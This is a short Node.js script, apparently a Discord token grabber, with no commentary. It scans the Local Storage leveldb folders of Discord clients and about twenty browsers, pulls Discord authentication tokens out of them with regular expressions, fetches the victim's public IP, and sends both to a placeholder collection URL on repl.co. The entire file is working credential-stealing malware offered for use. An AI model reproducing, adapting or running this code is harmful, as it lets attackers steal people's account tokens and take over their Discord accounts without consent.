const fs = require('fs')
const fetch = require('node-fetch')
const apiurl = "https://exemple.exemple.repl.co/grabbed"

var paths = [
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Discord/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordptb/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
    `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`
]

for (a = 0; a < paths.length; a++) {
    grabtoken(paths[a])
}

function grabtoken(gt) {
    try {
        fs.readdir(gt, (erreur, fichier) => {
            if (fichier) {
                var f = fichier.filter(f => f.split('.').pop() == "ldb")
                for (a = 0; a < f.length; a++) {
                    fs.readFile(`${gt}/${f[a]}`, 'utf-8', function (erreur, tok3n) {
                        var u = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
                        var v = /"mfa\.[\d\w_-]{84}"/
                        var [token] = u.exec(tok3n) || v.exec(tok3n) || [undefined];
                        if (token) {
                            fetch('https://api.ipify.org?format=json')
                                .then(res => res.json())
                                .then(json => {
                                    fetch(apiurl, {
                                        headers: {
                                            "token": token,
                                            "ip": json.ip
                                        }
                                    })
                                })
                        }
                    })
                }
            }
        })
    } catch (error) {}
}